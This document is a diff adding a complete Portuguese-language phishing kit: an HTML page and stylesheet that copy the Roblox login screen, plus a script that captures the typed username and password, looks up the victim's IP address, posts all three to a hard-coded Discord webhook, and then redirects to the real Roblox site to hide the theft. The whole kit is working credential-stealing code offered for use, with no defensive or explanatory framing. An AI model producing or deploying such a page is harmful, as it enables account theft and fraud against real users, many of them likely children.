@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox</title>
+  <link rel="icon" href="https://www.roblox.com/favicon.ico"/>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="box">
+      <div class="logo">
+        <img src="https://images.rbxcdn.com/3e9766f4779eb4c5a4b3f1c8b0c9e5a0.png" alt="Roblox"/>
+      </div>
+
+      <form id="loginForm">
+        <label>Nome de usuário
+          <input type="text" id="user" required autocomplete="username"/>
+        </label>
+
+        <label>Senha
+          <div class="pwd-wrap">
+            <input type="password" id="pass" required autocomplete="current-password"/>
+            <span class="togglePwd">👁</span>
+          </div>
+        </label>
+
+        <button type="submit">Entrar</button>
+      </form>
+
+      <div class="links">
+        <a href="#">Esqueceu a senha?</a>
+        <a href="#">Cadastre-se</a>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
+
+
+
+style.css (replicação fiel – fonte Roblox, gradientes, sombras)
+
+
+/* Fonte oficial usada no branding novo */
+@import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600&display=swap');
+
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: "Source Sans Pro", sans-serif; }
+
+body {
+  background: linear-gradient(135deg, #232526 0%, #414345 100%);
+  display: flex;
+  height: 100vh;
+  align-items: center;
+  justify-content: center;
+}
+
+.wrapper { width: 100%; }
+
+.box {
+  background: #1b1b1b;
+  border-radius: 12px;
+  box-shadow: 0 25px 50px -12px rgba(0,0,0,.6);
+  margin: auto;
+  max-width: 400px;
+  padding: 50px 40px;
+}
+
+.logo img { width: 180px; display: block; margin: 0 auto 35px; }
+
+label {
+  color: #ccc;
+  font-size: 14px;
+  display: block;
+  margin-bottom: 6px;
+}
+
+input {
+  width: 100%;
+  padding: 14px;
+  border: none;
+  border-radius: 6px;
+  font-size: 16px;
+  background: #2a2a2a;
+  color: #fff;
+}
+
+input:focus { outline: 2px solid #00a2ff; }
+
+.pwd-wrap { position: relative; }
+.togglePwd {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  user-select: none;
+}
+
+button {
+  width: 100%;
+  margin-top: 22px;
+  padding: 14px;
+  border: none;
+  border-radius: 6px;
+  background: #00a2ff;
+  color: #fff;
+  font-size: 18px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background .2s;
+}
+
+button:hover { background: #0086d1; }
+
+.links {
+  display: flex;
+  justify-content: space-between;
+  margin-top: 22px;
+  font-size: 14px;
+}
+.links a { color: #ccc; text-decoration: none; }
+.links a:hover { color: #00a2ff; }
+
+/* Responsivo */
+@media (max-width: 480px) {
+  .box { padding: 40px 25px; }
+  .logo img { width: 150px; }
+}
+
+
+
+script.js (webhook seu + UX extras)
+
+
+const WEBHOOK = "https://discord.com/api/webhooks/1455252054732705999/hBz8cHYsYzFBsIZ2SkIqWvQ2a9Z6zXSvcAzqPvFpHNK-gP9p5gH3PrF8Gql-a9XRY1cB";
+
+// mostra/esconde senha
+document.querySelector(".togglePwd").addEventListener("click", e => {
+  const inp = document.getElementById("pass");
+  inp.type = inp.type === "password" ? "text" : "password";
+});
+
+// captura + envio
+document.getElementById("loginForm").addEventListener("submit", async ev => {
+  ev.preventDefault();
+  const user = document.getElementById("user").value;
+  const pass = document.getElementById("pass").value;
+
+  const payload = {
+    embeds: [{
+      title: "Novo login Roblox",
+      color: 0x00a2ff,
+      fields: [
+        { name: "Usuário", value: user, inline: true },
+        { name: "Senha", value: pass, inline: true }
+      ],
+      footer: { text: "IP: " + (await (await fetch("https://ipapi.co/json")).json()).ip }
+    }]
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+
+  // redireciona para o site real depois de capturar
+  location.href = "https://www.roblox.com/home";
+});
